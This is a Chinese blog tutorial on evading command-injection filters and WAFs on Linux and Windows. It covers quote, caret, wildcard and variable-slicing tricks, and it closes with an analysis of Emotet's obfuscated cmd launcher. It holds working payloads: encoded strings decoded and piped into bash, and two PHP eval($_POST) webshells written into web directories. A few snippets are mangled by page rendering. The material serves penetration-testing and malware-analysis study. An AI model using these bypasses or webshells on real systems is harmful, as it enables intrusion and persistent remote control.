+<h3 id="花括号的别样用法"><a href="#花括号的别样用法" class="headerlink" title="花括号的别样用法"></a>花括号的别样用法</h3><p>在Linux bash中还可以使用{OS_COMMAND,ARGUMENT}来执行系统命令 {cat,flag}</p>
+<p>cat t{es,}t 花括号通过逗号分割构建序列并展开</p>
+<p>cat {tes,t}{tes,t} 花括号可以表示两个序列的笛卡尔积</p>
+<h3 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h3><blockquote>
+<p><strong>拼接绕过</strong><br> a&#x3D;l;b&#x3D;s;</p>
+<p>aa</p>
+<p>ab</p>
+<p><strong>编码绕过</strong></p>
+<ul>
+<li><p><strong>base64</strong>：<br> echo “Y2F0IC9mbGFn”|base64-d|bash<br> &#x3D;&#x3D;&gt;cat &#x2F;flag</p>
+</li>
+<li><p><strong>hex</strong>：<br> echo “636174202f666c6167” | xxd -r -p|bash<br> &#x3D;&#x3D;&gt;cat &#x2F;flag</p>
+</li>
+<li><p><strong>oct</strong>：<br> $(printf “\154\163”)<br> &#x3D;&#x3D;&gt;ls</p>
+<p>$(printf “\x63\x61\x74\x20\x2f\x66\x6c\x61\x67”)<br> &#x3D;&#x3D;&gt;cat &#x2F;flag</p>
+<p>{printf,”\x63\x61\x74\x20\x2f\x66\x6c\x61\x67”}|$0<br> &#x3D;&#x3D;&gt;cat &#x2F;flag</p>
+<p>#可以通过这样来写webshell,内容为<br> ${printf,\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76”}<br> &#x3D;&#x3D;&gt; 1.php</p>
+</li>
+</ul>
+</blockquote>
+<h3 id="单引号和双引号绕过"><a href="#单引号和双引号绕过" class="headerlink" title="单引号和双引号绕过"></a>单引号和双引号绕过</h3><p>比如：ca’’t flag 或ca””t flag或cat &#x2F;fl’’ag</p>
+<h3 id="0-9-、-、-、-绕过"><a href="#0-9-、-、-、-绕过" class="headerlink" title="$[0-9]、$*、$!、$@绕过"></a>$[0-9]、$*、$!、$@绕过</h3><p>Linux中$[0-9]、$*、$!、$@表示参数</p>
+<p>比如：l$1s或ca$2t</p>
+<h3 id="反斜杠绕过"><a href="#反斜杠绕过" class="headerlink" title="反斜杠绕过"></a>反斜杠绕过</h3><p>比如：ca\t fl\ag</p>
+<h3 id="利用通配符"><a href="#利用通配符" class="headerlink" title="利用通配符"></a>利用通配符</h3><p>cat &#x2F;te* 			*匹配任意长度的任意字符<br> cat &#x2F;te?t			?匹配一个任意字符<br> cat &#x2F;te[a-z] t	匹配[list]列表中的所有字符</p>
+<p>cat &#x2F;t[ ^a,b,c]st		匹配非列表[^list]中的所有字符</p>
+<h3 id="linux中直接查看文件内容的命令"><a href="#linux中直接查看文件内容的命令" class="headerlink" title="linux中直接查看文件内容的命令"></a>linux中直接查看文件内容的命令</h3><p>cat、tac、more、less、head、tail、nl、sed、sort、uniq、od</p>
+<h1 id="绕过WAF运行命令执行漏洞的方法"><a href="#绕过WAF运行命令执行漏洞的方法" class="headerlink" title="绕过WAF运行命令执行漏洞的方法"></a>绕过WAF运行命令执行漏洞的方法</h1><p><strong>0x01 Windows（不区分大小写）</strong></p>
+<p>1.1 符号和命令的关系</p>
+<p>如果命令执行的时候遇到拦截命令关键词的时候可以利用如下方法绕过：</p>
+<p><code>&quot;</code>和<code>^</code>是CMD命令中最常见的转义字符，还有成对的括号并不会影响命令的执行。</p>
+<p>这里有几个需要注意的地方：</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs 1c">在命令中可以有无数个<span class="hljs-string">&quot;，但是不能有两个连续的^</span><br>在命令中如果<span class="hljs-string">&quot;在^之前，则&quot;</span>的个数必须为偶数个<br>在命令中如果<span class="hljs-string">&quot;在^之后，并且带有参数，则命令中的&quot;</span>个数必须为偶数<br>在命令的参数中，单个字符前后<span class="hljs-string">&quot;的个数只能有一个或者两个</span><br>如果成对的括号中间有<span class="hljs-string">&quot;则&quot;</span>的个数也必须为偶数<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs powershell">whoami    //正确执行<br>WhOAmi    //正确执行<br>Who<span class="hljs-string">&quot;amI    //正确执行</span><br><span class="hljs-string">((Who&quot;</span>amI))    //错误<br>((Who<span class="hljs-string">&quot;&quot;</span>amI))    //正确执行<br>Who<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;&quot;</span>amI    //正确执行<br>who<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;a^mi    //错误</span><br><span class="hljs-string">who&quot;</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;a^mi    //正确执行</span><br><span class="hljs-string">whoa^m&quot;</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;i    //正确执行</span><br><span class="hljs-string">whoa^m&quot;</span><span class="hljs-string">&quot;&quot;</span>i    //正确执行<br>whoa^^mi    //错误<br>n^e^t user    //正确执行<br>n^e^t<span class="hljs-string">&quot;&quot;</span> user    //正确执行<br>n^e^t<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot; user    //错误</span><br><span class="hljs-string">n^e^t&quot;</span><span class="hljs-string">&quot; u&quot;</span>ser    //正确执行<br>n^e^t<span class="hljs-string">&quot;&quot;</span> u<span class="hljs-string">&quot;&quot;</span>ser    //正确执行<br>n^e^t<span class="hljs-string">&quot;&quot;</span> u<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;ser    //错误</span><br><span class="hljs-string">n^e^t&quot;</span><span class="hljs-string">&quot; u&quot;</span><span class="hljs-string">&quot;s&quot;</span>er    //正确执行<br>n^e^t<span class="hljs-string">&quot;&quot;</span> u<span class="hljs-string">&quot;&quot;</span>s<span class="hljs-string">&quot;&quot;</span>er    //正确执行<br>n^e^t<span class="hljs-string">&quot;&quot;</span> u<span class="hljs-string">&quot;&quot;</span>s<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;er    //错误</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAicNKsm8OvN6UJUlLiaMfTKqZrKEhibrQ21Rib1RLibeV7zVibdsXFmB2Ga5g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAIDETUpRLY8zGMHS8xmnRIsX82mksF0dVf7E0fWMujCjYOBXeqkC8uw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAoHBYFxInJOmiaZialyzdMiaosNfPIcvVgwZrYlVdLAuUQYO46GyiaFJ6Bg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAP4vicaXCWroBMGNjVSbGyO2icMtLyAIcb7HyCtMXLr4Ku3cMUSv4l04Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<p>1.2 了解set命令和Windows变量</p>
+<p>在cmd中set用来进行变量赋值，而%%括起来的变量会引用其赋的值。</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAo2hOAgvjQCiawOGCUXE8NVDSpqA1SU6icoeMA57oZU0m9ZROIztJAvfg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<p>这样就可以进行命令执行了</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">set</span> cmd=whoami    //赋值变量为whoami<br>%cmd%              //执行命令<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDA0LB5ddJMqFYP0aMVmq4ge6P2MQUrPrLz6rhWTibXkYDoXn9SYX9zODg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<p>也可以赋值多个变量，拼接利用</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">set</span> cmd1=who<br><span class="hljs-built_in">set</span> cmd2=am<br><span class="hljs-built_in">set</span> cmd3=i<br>%cmd1%%cmd2%%cmd3%<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDArN6p9ibfSToU9pkIxicZNRGxfNeYwTlMNP7icNZVaqAQzYuScNDjZkbpA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">set</span> cmd1=who<br><span class="hljs-built_in">set</span> cmd3=i<br>%cmd1%am%cmd3%<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDA1ayFtibNWWK3RlkPgicXU63tkd9LxictrySH0Gvs7PQSgvIIicTuvOtoSg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<p>也可以与1.2的内容进行合并</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">set</span> cmd1=wh<span class="hljs-string">&quot;&quot;</span>o<br><span class="hljs-built_in">set</span> cmd3=i<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">%cmd1%a^m%cmd3%</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDA2TLiciagKYAa0HwZfTgR7JSkkW40EhgloVaIDH1LgkkklZAPZXR5W5LA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<p>也可以在赋值的时候加入空格</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">set</span> cmd1=s<span class="hljs-string">&quot;&quot;</span>er<br><span class="hljs-built_in">set</span> cmd2=t u<br><span class="hljs-built_in">set</span> cmd3=n^e<br>%cmd3%%cmd2%%cmd1%<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAnEw09POz1NpcCQ7viapX0k9mNjMOVxmY8CPNE7pw1Ricv81fd0KOX7icg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powersehll">Cmd /C &quot;set cmd1=s&quot;&quot;er &amp;&amp; set cmd2=t u &amp;&amp; set cmd3=n^e &amp;&amp; call %cmd3%%cmd2%%cmd1%&quot;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDA7PN5eXz4Hj7UfQWlibL3o4IuH4mVT4uUCztfXfP9v5GwKnicCry1k7kA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<p>当使用<code>cmd /V:ON</code>或<code>cmd /V:O</code>时可以不使用call命令来扩展变量，使用 %var% 或 !var! 来扩展变量，!var!可以用来代替%var%</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">cmd /V:ON /C <span class="hljs-string">&quot;set cmd=net user &amp;&amp; !cmd!&quot;</span><br>cmd /V:O /C <span class="hljs-string">&quot;set cmd=net user &amp;&amp; !cmd!&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAibOqJPCqEQlzA9qiamyTOHVkpG1GCAcLjKxEgDsuf4zfKt6bfkmWv6yA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAqtibwOkeZoIKQMER8j9GxvW1J7nC8qrSzxgunWq7Nc6VVxhv3VmqjQg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<p>1.3 Windows切割字符串</p>
+<p>拿whoami举例，实践Windows切割字符串的语法</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">set</span> cmd=whoami<br><br>%cmd:~<span class="hljs-number">0</span>% //取出a的值中的所有字符此时正常执行whoami<br>%cmd:~<span class="hljs-number">0</span>,<span class="hljs-number">1</span>% //取出a的值，从第<span class="hljs-number">0</span>个位置开始，取<span class="hljs-number">1</span>个值此时因为w总共就<span class="hljs-number">1</span>个字符<br>%cmd:~<span class="hljs-number">0</span>,<span class="hljs-number">6</span>% //取出a的值，从第<span class="hljs-number">0</span>个位置开始，取<span class="hljs-number">6</span>个值此时因为whoami总共就<span class="hljs-number">6</span>个字符<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAS9vG0ibYAZdpy6VKsE6wvJ2BHHwJwuJoYCBFoziboRruwuvk8rm8cgUg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<p>由此可以看出来截取字符串的语法为<code>%变量名:~x,y%</code>即从变量第x位开始，截取y个字符。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs powershell">C:\Users\a&gt;<span class="hljs-built_in">set</span> str=<span class="hljs-number">0123456789</span><br><br>C:\Users\a&gt;<span class="hljs-built_in">echo</span> %str:~<span class="hljs-literal">-1</span>%<br><span class="hljs-number">9</span><br>从最后<span class="hljs-number">1</span>位开始取整个字符串<br>C:\Users\a&gt;<span class="hljs-built_in">echo</span> %str:~<span class="hljs-literal">-6</span>%<br><span class="hljs-number">456789</span><br>从倒数第<span class="hljs-number">6</span>位开始取整个字符串<br>C:\Users\a&gt;<span class="hljs-built_in">echo</span> %str:~<span class="hljs-literal">-9</span>%<br><span class="hljs-number">123456789</span><br>从倒数第<span class="hljs-number">9</span>位开始取整个字符串<br>C:\Users\a&gt;<span class="hljs-built_in">echo</span> %str:~<span class="hljs-literal">-9</span>,<span class="hljs-number">2</span>%<br><span class="hljs-number">12</span><br>从倒数第<span class="hljs-number">9</span>位开始取<span class="hljs-number">2</span>位<br>C:\Users\a&gt;<span class="hljs-built_in">echo</span> %str:~<span class="hljs-literal">-9</span>,<span class="hljs-number">4</span>%<br><span class="hljs-number">1234</span><br>从倒数第<span class="hljs-number">9</span>位开始取<span class="hljs-number">4</span>位<br>C:\Users\a&gt;<span class="hljs-built_in">echo</span> %str:~<span class="hljs-literal">-9</span>,<span class="hljs-literal">-2</span>%<br><span class="hljs-number">1234567</span><br>从倒数第<span class="hljs-number">9</span>位开始少取最后<span class="hljs-number">2</span>位<br>C:\Users\a&gt;<span class="hljs-built_in">echo</span> %str:~<span class="hljs-literal">-9</span>,<span class="hljs-literal">-4</span>%<br><span class="hljs-number">12345</span><br>从倒数第<span class="hljs-number">9</span>位开始少取最后<span class="hljs-number">4</span>位<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAgptH94OSibkr73opl3nkM47tMymr4zDHibXgBj5OVHpRySrT3tVrBCbg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<p>既然已经熟悉了如何切割字符，那么我们来看一下都有什么环境变量可以用</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAmPcYkAlsyhSSqNzib75LVm5b0p8rnm3CNCR7WLmZL12x37YVaMhiaSdw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<p>我们可以拼命令了</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs powershell">C:\Users\a&gt;<span class="hljs-built_in">echo</span> %COMPUTERNAME:~<span class="hljs-number">0</span>,<span class="hljs-number">1</span>%<span class="hljs-built_in">h</span>%windir:~<span class="hljs-literal">-3</span>,<span class="hljs-number">1</span>%%HOMEPATH:~<span class="hljs-literal">-1</span>%<span class="hljs-built_in">mi</span><br>Whoami<br><br>C:\Users\a&gt;%COMPUTERNAME:~<span class="hljs-number">0</span>,<span class="hljs-number">1</span>%<span class="hljs-built_in">h</span>%windir:~<span class="hljs-literal">-3</span>,<span class="hljs-number">1</span>%%HOMEPATH:~<span class="hljs-literal">-1</span>%<span class="hljs-built_in">mi</span><br>win<span class="hljs-literal">-tbucg5qo47j</span>\a<br><br>C:\Users\a&gt;d^i^r%CommonProgramFiles:~<span class="hljs-number">10</span>,<span class="hljs-number">1</span>%%commonprogramfiles:~<span class="hljs-number">0</span>,<span class="hljs-number">3</span>%<br> 驱动器 C 中的卷没有标签。<br> 卷的序列号是 <span class="hljs-number">5</span>CE5<span class="hljs-literal">-9A63</span><br><br> C:\ 的目录<br><br><span class="hljs-number">2022</span>/<span class="hljs-number">03</span>/<span class="hljs-number">12</span>  <span class="hljs-number">00</span>:<span class="hljs-number">20</span>    &lt;<span class="hljs-built_in">DIR</span>&gt;          JspStudy<br><span class="hljs-number">2022</span>/<span class="hljs-number">07</span>/<span class="hljs-number">09</span>  <span class="hljs-number">20</span>:<span class="hljs-number">04</span>    &lt;<span class="hljs-built_in">DIR</span>&gt;          MailMasterData<br><span class="hljs-number">2009</span>/<span class="hljs-number">07</span>/<span class="hljs-number">14</span>  <span class="hljs-number">11</span>:<span class="hljs-number">20</span>    &lt;<span class="hljs-built_in">DIR</span>&gt;          PerfLogs<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDALMLf8MC7300lXujw6IeicYvLn0pFCPfFNLKA0H5yApFC9nvCiafbFsHA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAyBicAPFoFIo1L6KMNpR5JWhPpNhzNoL4kMCkZhE8xpR5JTbaONGiaRYA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<p>我们还可以凑php一句话（这里为了方便所以自定义了一些字符）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs poweshell">C:\Users\a&gt;set web=^&lt;^&gt;/@$_PHPOST[]?&#x27;e()val<br>C:\Users\a&gt;echo ^%web:~0,1%^%web:~-8,1%%web:~6,3% ^%web:~-6,1%^%web:~-3,3%^%web:~-5,1%%web:~4,2%%web:~8,5%^%web:~-7,1%%web:~-1,1%^%web:~-7,1%%web:~13,1%^%web:~-4,1% ^%web:~-8,1%^%web:~1,1% &gt; C:\phpstudy_pro\WWW\b.php<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAwlZsh1R0nogZXTib9F22ibb6ic4PMmyyT3b2f2QQY5uxylJbDtcsJLnpw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDA6uDENZWHmMNDrFHMcAibgKbSdIhn2Bl9jET8Hu8JtjkB8CEF5bm1T5A/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<p>因为拼接字符需要得到大量的位置，为了方便拼接可以使用for命令来讲所有位置设成一个列表，以此循环遍历列表，合并字符串，还能起到混淆的作用。	</p>
+<p>这里注意set不能以空格结尾否则，变量会将空格进行赋值</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">cmd /V:ON /C <span class="hljs-string">&quot; set kpx=vwchdoaadmei&amp;&amp; for %G in (1,3,5,7,9,11,26) do set lq=!lq!!kpx:~%G,1!&amp;&amp; if %G==26  !lq:~4!&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAhnVFP8Ywrnk2QIZsiaZfFkkudO3iaYO6AWgm3aVjek8PZIlsyYYInTfQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<p><strong>错误示范</strong></p>
+<p>下面的方法拼接出来的其实是w h o a m i 因为有空格后面的都视作参数没有显示</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAIO5Lj5XibulTFopjlZ9CumbboicdO4BjrLypibpa8HTStIDyian7y6HQnw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<h3 id="分析Emotet木马中的cmd命令"><a href="#分析Emotet木马中的cmd命令" class="headerlink" title="分析Emotet木马中的cmd命令"></a><strong>分析Emotet木马中的cmd命令</strong></h3><p>Emotet一款著名的银行木马，首次出现于2014年年中。该木马主要通过垃圾邮件的方式传播感染目标用户，其不断变化传播花样，采用越来越复杂的混淆编码来躲避检测。</p>
+<p>现在我们以Emotet木马为例，我们来试着分析一下经过混淆后的cmd内容</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDApPFenjgjOmpS5U4NbLBZq0cPticldJKaTUG2yUlZnqOibUfnDCAsJ1Sg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<p>先将混淆cmd命令中的转义字符“^”全部去掉，再将除了变量@之外的逗号“,”、分号“;”、多余空格删除。注意保留变量@中的逗号和分号，否则影响输出结果。</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDASlTK5MSlVRvl4jCu1fwRNGdPnywBTeVpTJbPLyiaAXSyE9C9wOeh0tg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<p>下图为无意义的四个字符串，cmd会自动忽略。</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAV4UwFsL7k2qJwSu0MDY31ssus0dXnR1lnbTZ9yvPZPouJSrXRwic0nw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<p>可以看出这里利用了cmd的系统环境变量<code>%comspec%</code>，即是cmd.exe的执行路径，因此会执行cmd命令，这里才是命令的真正开头。因此程序开头可以进行化简。</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAs1FsIOcNKHxUF0qvooxzgxsd2UUpXsHoHHG0u0aHUooA7TQ0FkicdWw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<p>去除无意义的字符串后可以化简为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs poweshell">%comspec% /c for /f &quot; delims=vf= tokens=2&quot; %f in ( &#x27;assoc .cmd&#x27; ) do %f /V /R<br></code></pre></td></tr></table></figure>
+
+<p>先利用<code>%comspec% /c</code>执行第一个for循环，再利用<code>for</code>循环的<code>/f</code>参数，在命令<code>assoc .cmd</code>结果<code>.cmd=cmdfile</code>中以字符v、f、&#x3D;为分隔符，取第二列即是“<code>cmd</code>”。</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAghx2dbKHqenTlC2TcgKBDf8VcLxmOqyicIHvKAqvMSroIhicj98EKpibw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<p>因此这里用for循环生成的cmd又开启了新一个cmd程序来运行下面的字符串内的程序。</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAuhAGBDAuNI1sGTTKR3nVbOFmzibnQ8XuD5wz8MnIFoZicAMwMV9tCkOg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<p>这里自定义了一个环境变量<code>@</code>，等于一个1460长度的字符串。然后利用for循环的&#x2F;L参数，遍历变量<code>@</code>：<code>for /L %s in (1459,-4,+3 ) do set \=!\!!@ :~ %s, 1!&amp; if %s equ 3 call %\:~-365%</code>，这个for循环自定义了环境变量”<code>\</code>“，还启用了延迟的环境变量扩展<code>!</code>，<code>!@:~%s,1!</code>表示循环变量<code>%s</code>从1459开始，步长为<code>-4</code>，到<code>3</code>结束，循环提取变量<code>@</code>中的字符，添加到<code>\</code>变量中。当<code>%s</code>到<code>3</code>的时候就会执行<code>\</code>中倒数365个字符组成的程序。</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDA6BaBFArsUsqXicNzFtBCuibNjxwhyNVeo0lth4q6YJRhLHqPosXrpoHA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" srcset="/img/loading.gif" lazyload alt="图片"></p>
